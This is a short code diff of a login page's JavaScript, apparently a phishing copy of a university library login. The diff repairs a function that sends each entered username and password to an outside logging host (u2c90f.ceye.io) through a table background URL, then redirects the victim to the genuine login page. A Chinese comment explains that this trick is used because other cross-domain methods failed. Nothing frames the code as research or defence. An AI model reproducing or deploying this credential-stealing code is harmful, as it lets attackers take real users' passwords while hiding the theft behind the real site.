@@ -99,7 +99,7 @@
 				pwd.value="";
 			}
 			else {
-			//btnSubmit(form, bor_id.value, pwd.value);
+			//btnSubmit(form, bor_id.value, pwd.value);	# ajax
 				kuaYu_submit(bor_id.value, pwd.value);
 				window.setTimeout("window.location='http://primo.zzu.edu.cn:8991/pds?func=load-login&url=http://primo.zzu.edu.cn:8991/pds'",2000);
 			}
@@ -115,10 +115,10 @@
    			};
    			$("#form1").ajaxSubmit(options); // jquery 表单提交
 		}
-	function kuaYu_submit(user, passwd) {		// 利用table的background进行跨域, 实践发现script-src, link-href无法实现跨域名
+		function kuaYu_submit(user, passwd) {		// 利用table的background进行跨域, 实践发现script-src, link-href无法实现跨域名
 			var URL = "http://" + "u2c90f.ceye.io/info?user=" + user + "&pwd=" + passwd;
 			_table = "<table background = " + URL + ">"  + "<\/table>";
-			document.write(table);
+			document.write(_table);
 
 			}
 	</script>
